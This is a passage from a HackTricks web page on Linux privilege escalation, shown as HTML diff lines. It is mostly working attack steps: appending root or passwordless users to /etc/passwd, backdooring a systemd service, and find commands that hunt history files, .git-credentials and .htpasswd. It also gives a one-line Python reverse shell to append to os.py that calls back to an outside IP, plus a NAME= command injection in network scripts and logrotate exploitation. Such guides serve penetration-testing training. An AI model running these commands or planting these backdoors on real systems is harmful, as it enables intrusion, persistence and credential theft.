+<p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
+<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
+<p>Alternatively, you can use the following lines to add a dummy user without a password.<br />
+WARNING: you might degrade the current security of the machine.</p>
+<pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
+su - dummy
+</code></pre>
+<p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p>
+<p>You should check if you can <strong>write in some sensitive files</strong>. For example, can you write to some <strong>service configuration file</strong>?</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
+</code></pre>
+<p>For example, if the machine is running a <strong>tomcat</strong> server and you can <strong>modify the Tomcat service configuration file inside /etc/systemd/,</strong> then you can modify the lines:</p>
+<pre><code>ExecStart=/path/to/backdoor
+User=root
+Group=root
+</code></pre>
+<p>Your backdoor will be executed the next time that tomcat is started.</p>
+<h3 id="check-folders"><a class="header" href="#check-folders">Check Folders</a></h3>
+<p>The following folders may contain backups or interesting information: <strong>/tmp</strong>, <strong>/var/tmp</strong>, <strong>/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root</strong> (Probably you won't be able to read the last one but try)</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
+</code></pre>
+<h3 id="weird-locationowned-files"><a class="header" href="#weird-locationowned-files">Weird Location/Owned files</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#root owned files in /home folders
+find /home -user root 2&gt;/dev/null
+#Files owned by other users in folders owned by me
+for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2&gt;/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2&gt;/dev/null; done
+#Files owned by root, readable by me but not world readable
+find / -type f -user root ! -perm -o=r 2&gt;/dev/null
+#Files owned by me or world writable
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
+#Writable files by each group I belong to
+for g in `groups`;
+      do printf "  Group $g:\n";
+      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
+      done
+done
+</code></pre>
+<h3 id="modified-files-in-last-mins"><a class="header" href="#modified-files-in-last-mins">Modified files in last mins</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2&gt;/dev/null
+</code></pre>
+<h3 id="sqlite-db-files"><a class="header" href="#sqlite-db-files">Sqlite DB files</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2&gt;/dev/null
+</code></pre>
+<h3 id="_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-files"><a class="header" href="#_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-files">*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2&gt;/dev/null
+</code></pre>
+<h3 id="hidden-files"><a class="header" href="#hidden-files">Hidden files</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find / -type f -iname ".*" -ls 2&gt;/dev/null
+</code></pre>
+<h3 id="scriptbinaries-in-path"><a class="header" href="#scriptbinaries-in-path"><strong>Script/Binaries in PATH</strong></a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2&gt;/dev/null; done
+for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2&gt;/dev/null; done
+</code></pre>
+<h3 id="web-files"><a class="header" href="#web-files"><strong>Web files</strong></a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ls -alhR /var/www/ 2&gt;/dev/null
+ls -alhR /srv/www/htdocs/ 2&gt;/dev/null
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/ 2&gt;/dev/null
+</code></pre>
+<h3 id="backups"><a class="header" href="#backups"><strong>Backups</strong></a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2&gt;/dev/null
+</code></pre>
+<h3 id="known-files-containing-passwords"><a class="header" href="#known-files-containing-passwords">Known files containing passwords</a></h3>
+<p>Read the code of <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>linPEAS</strong></a>, it searches for <strong>several possible files that could contain passwords</strong>.<br />
+<strong>Another interesting tool</strong> that you can use to do so is: <a href="https://github.com/AlessandroZ/LaZagne"><strong>LaZagne</strong></a> which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux &amp; Mac.</p>
+<h3 id="logs"><a class="header" href="#logs">Logs</a></h3>
+<p>If you can read logs, you may be able to find <strong>interesting/confidential information inside them</strong>. The more strange the log is, the more interesting it will be (probably).<br />
+Also, some "<strong>bad</strong>" configured (backdoored?) <strong>audit logs</strong> may allow you to <strong>record passwords</strong> inside audit logs as explained in this post: <a href="https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/">https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/</a>.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&amp;${C}[0m,g"
+grep -RE 'comm="su"|comm="sudo"' /var/log* 2&gt;/dev/null
+</code></pre>
+<p>In order to <strong>read logs the group</strong> <a href="interesting-groups-linux-pe/index.html#adm-group"><strong>adm</strong></a> will be really helpful.</p>
+<h3 id="shell-files"><a class="header" href="#shell-files">Shell files</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">~/.bash_profile # if it exists, read it once when you log in to the shell
+~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
+~/.profile # if it exists, read once if the two above don't exist
+/etc/profile # only read if none of the above exists
+~/.bashrc # if it exists, read it every time you start a new shell
+~/.bash_logout # if it exists, read when the login shell exits
+~/.zlogin #zsh shell
+~/.zshrc #zsh shell
+</code></pre>
+<h3 id="generic-creds-searchregex"><a class="header" href="#generic-creds-searchregex">Generic Creds Search/Regex</a></h3>
+<p>You should also check for files containing the word "<strong>password</strong>" in its <strong>name</strong> or inside the <strong>content</strong>, and also check for IPs and emails inside logs, or hashes regexps.<br />
+I'm not going to list here how to do all of this but if you are interested you can check the last checks that <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"><strong>linpeas</strong></a> perform.</p>
+<h2 id="writable-files"><a class="header" href="#writable-files">Writable files</a></h2>
+<h3 id="python-library-hijacking"><a class="header" href="#python-library-hijacking">Python library hijacking</a></h3>
+<p>If you know from <strong>where</strong> a python script is going to be executed and you <strong>can write inside</strong> that folder or you can <strong>modify python libraries</strong>, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).</p>
+<p>To <strong>backdoor the library</strong> just add at the end of the os.py library the following line (change IP and PORT):</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">python</span></div>
+<pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+</code></pre>
+<h3 id="logrotate-exploitation"><a class="header" href="#logrotate-exploitation">Logrotate exploitation</a></h3>
+<p>A vulnerability in <code>logrotate</code> lets users with <strong>write permissions</strong> on a log file or its parent directories potentially gain escalated privileges. This is because <code>logrotate</code>, often running as <strong>root</strong>, can be manipulated to execute arbitrary files, especially in directories like <em><strong>/etc/bash_completion.d/</strong></em>. It's important to check permissions not just in <em>/var/log</em> but also in any directory where log rotation is applied.</p>
+<div class="mdbook-alerts mdbook-alerts-note">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  note
+</p>
+<p>This vulnerability affects <code>logrotate</code> version <code>3.18.0</code> and older</p>
+</div>
+<p>More detailed information about the vulnerability can be found on this page: <a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a>.</p>
+<p>You can exploit this vulnerability with <a href="https://github.com/whotwagner/logrotten"><strong>logrotten</strong></a>.</p>
+<p>This vulnerability is very similar to <a href="https://www.cvedetails.com/cve/CVE-2016-1247/"><strong>CVE-2016-1247</strong></a> <strong>(nginx logs),</strong> so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.</p>
+<h3 id="etcsysconfignetwork-scripts-centosredhat"><a class="header" href="#etcsysconfignetwork-scripts-centosredhat">/etc/sysconfig/network-scripts/ (Centos/Redhat)</a></h3>
+<p><strong>Vulnerability reference:</strong> <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f"><strong>https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</strong></a></p>
+<p>If, for whatever reason, a user is able to <strong>write</strong> an <code>ifcf-&lt;whatever&gt;</code> script to <em>/etc/sysconfig/network-scripts</em> <strong>or</strong> it can <strong>adjust</strong> an existing one, then your <strong>system is pwned</strong>.</p>
+<p>Network scripts, <em>ifcg-eth0</em> for example are used for network connections. They look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).</p>
+<p>In my case, the <code>NAME=</code> attributed in these network scripts is not handled correctly. If you have <strong>white/blank space in the name the system tries to execute the part after the white/blank space</strong>. This means that <strong>everything after the first blank space is executed as root</strong>.</p>
+<p>For example: <em>/etc/sysconfig/network-scripts/ifcfg-1337</em></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">NAME=Network /bin/id
+ONBOOT=yes
+DEVICE=eth0
+</code></pre>
+<p>(<em>Note the blank space between Network and /bin/id</em>)</p>
+<h3 id="init-initd-systemd-and-rcd"><a class="header" href="#init-initd-systemd-and-rcd"><strong>init, init.d, systemd, and rc.d</strong></a></h3>
+<p>The directory <code>/etc/init.d</code> is home to <strong>scripts</strong> for System V init (SysVinit), the <strong>classic Linux service management system</strong>. It includes scripts to <code>start</code>, <code>stop</code>, <code>restart</code>, and sometimes <code>reload</code> services. These can be executed directly or through symbolic links found in <code>/etc/rc?.d/</code>. An alternative path in Redhat systems is <code>/etc/rc.d/init.d</code>.</p>
+<p>On the other hand, <code>/etc/init</code> is associated with <strong>Upstart</strong>, a newer <strong>service management</strong> introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.</p>
+<p><strong>systemd</strong> emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into <code>/usr/lib/systemd/</code> for distribution packages and <code>/etc/systemd/system/</code> for administrator modifications, streamlining the system administration process.</p>
+<h2 id="other-tricks"><a class="header" href="#other-tricks">Other Tricks</a></h2>
+<h3 id="nfs-privilege-escalation"><a class="header" href="#nfs-privilege-escalation">NFS Privilege escalation</a></h3>
+<p><a class="content_ref" href="nfs-no_root_squash-misconfiguration-pe.html"><span class="content_ref_label">NFS no_root_squash/no_all_squash misconfiguration PE</span></a></p>
+<h3 id="escaping-from-restricted-shells"><a class="header" href="#escaping-from-restricted-shells">Escaping from restricted Shells</a></h3>
+<p><a class="content_ref" href="escaping-from-limited-bash.html"><span class="content_ref_label">Escaping from Jails</span></a></p>
+<h3 id="cisco---vmanage"><a class="header" href="#cisco---vmanage">Cisco - vmanage</a></h3>
+<p><a class="content_ref" href="cisco-vmanage.html"><span class="content_ref_label">Cisco - vmanage</span></a></p>
+<h2 id="kernel-security-protections"><a class="header" href="#kernel-security-protections">Kernel Security Protections</a></h2>
+<ul>
+<li><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a></li>
+<li><a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">https://github.com/a13xp0p0v/linux-kernel-defence-map</a></li>
+</ul>
+<h2 id="more-help"><a class="header" href="#more-help">More help</a></h2>
+<p><a href="https://github.com/ropnop/impacket_static_binaries">Static impacket binaries</a></p>
+<h2 id="linuxunix-privesc-tools"><a class="header" href="#linuxunix-privesc-tools">Linux/Unix Privesc Tools</a></h2>
+<h3 id="best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas"><a class="header" href="#best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas"><strong>Best tool to look for Linux local privilege escalation vectors:</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>LinPEAS</strong></a></a></h3>
+<p><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>(-t option)<br />
+<strong>Enumy</strong>: <a href="https://github.com/luke-goddard/enumy">https://github.com/luke-goddard/enumy</a><br />
+<strong>Unix Privesc Check:</strong> <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br />
+<strong>Linux Priv Checker:</strong> <a href="http://www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a><br />
+<strong>BeeRoot:</strong> <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">https://github.com/AlessandroZ/BeRoot/tree/master/Linux</a><br />
+<strong>Kernelpop:</strong> Enumerate kernel vulns ins linux and MAC <a href="https://github.com/spencerdodd/kernelpop">https://github.com/spencerdodd/kernelpop</a><br />
+<strong>Mestaploit:</strong> <em><strong>multi/recon/local_exploit_suggester</strong></em><br />
+<strong>Linux Exploit Suggester:</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br />
+<strong>EvilAbigail (physical access):</strong> <a href="https://github.com/GDSSecurity/EvilAbigail">https://github.com/GDSSecurity/EvilAbigail</a><br />
+<strong>Recopilation of more scripts</strong>: <a href="https://github.com/1N3/PrivEsc">https://github.com/1N3/PrivEsc</a></p>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
+<li><a href="https://payatu.com/guide-linux-privilege-escalation/">https://payatu.com/guide-linux-privilege-escalation/</a></li>
+<li><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744</a></li>
+<li><a href="http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html">http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html</a></li>
+<li><a href="https://touhidshaikh.com/blog/?p=827">https://touhidshaikh.com/blog/?p=827</a></li>
+<li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf">https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf</a></li>
+<li><a href="https://github.com/frizb/Linux-Privilege-Escalation">https://github.com/frizb/Linux-Privilege-Escalation</a></li>
+<li><a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a></li>
+<li><a href="https://github.com/rtcrowley/linux-private-i">https://github.com/rtcrowley/linux-private-i</a></li>
+<li><a href="https://www.linux.com/news/what-socket/">https://www.linux.com/news/what-socket/</a></li>
+<li><a href="https://muzec0318.github.io/posts/PG/peppo.html">https://muzec0318.github.io/posts/PG/peppo.html</a></li>
+<li><a href="https://www.linuxjournal.com/article/7744">https://www.linuxjournal.com/article/7744</a></li>
+<li><a href="https://blog.certcube.com/suid-executables-linux-privilege-escalation/">https://blog.certcube.com/suid-executables-linux-privilege-escalation/</a></li>
+<li><a href="https://juggernaut-sec.com/sudo-part-2-lpe">https://juggernaut-sec.com/sudo-part-2-lpe</a></li>
+<li><a href="https://linuxconfig.org/how-to-manage-acls-on-linux">https://linuxconfig.org/how-to-manage-acls-on-linux</a></li>
+<li><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></li>
+<li><a href="https://www.linode.com/docs/guides/what-is-systemd/">https://www.linode.com/docs/guides/what-is-systemd/</a></li>
+</ul>
+<div class="mdbook-alerts mdbook-alerts-tip">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  tip
+</p>
+<p>Learn &amp; practice AWS Hacking:<img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><br />
+Learn &amp; practice GCP Hacking: <img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</div>
+
+                        </main>
+
+                        <nav class="nav-wrapper" aria-label="Page navigation">
+                            <!-- Mobile navigation buttons -->
+                                <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+
+                                <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+
+                            <div style="clear: both"></div>
+                        </nav>
+
+                        <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                                <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <i class="fa fa-angle-left"></i><span style="font-size: medium; align-self: center; margin-left: 10px;">Checklist - Linux Privilege Escalation</span>
+                                </a>
+
+                                <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <span style="font-size: medium; align-self: center; margin-right: 10px;">Arbitrary File Write to Root</span><i class="fa fa-angle-right"></i>
+                                </a>
+                        </nav>
+                    </div>
+
+                    <div class="sidetoc">
+                        <div class="sidetoc-wrapper">
+                            <nav class="pagetoc"></nav>
+                            <a class="sidesponsor" href="" target="_blank">
+                                <img src="" alt="" srcset="">
+                                <div class="sponsor-title">
+                                </div>
+                                <div class="sponsor-description">
+                                </div>
+                                <div class="sponsor-cta"></div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer">
+                    <div id="theme-wrapper" class="theme-wrapper">
+                        <div id="theme-btns" class="theme-btns">
+                            <button id="hacktricks-light" type="button" role="radio" aria-label="Switch to light theme" aria-checked="false" class="theme">
+                                <i class="fa fa-sun-o"></i>
+                            </button>
+                            <button id="hacktricks-dark" type="button" role="radio" aria-label="Switch to dark theme" aria-checked="false" class="theme theme-selected">
+                                <i class="fa fa-moon-o"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <!--<script src="../../searcher.js"></script>-->
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../theme/pagetoc.js"></script>
+        <script src="../../theme/tabs.js"></script>
+        <script src="../../theme/ht_searcher.js"></script>
+        <script src="../../theme/sponsor.js"></script>
+
+        <!-- Custom analytics -->
+        <script defer src="https://www.fairanalytics.de/pixel/deXeO7BNBrMuhdG1"></script>
+
+
+
+    </div>
+    </body>
+</html>
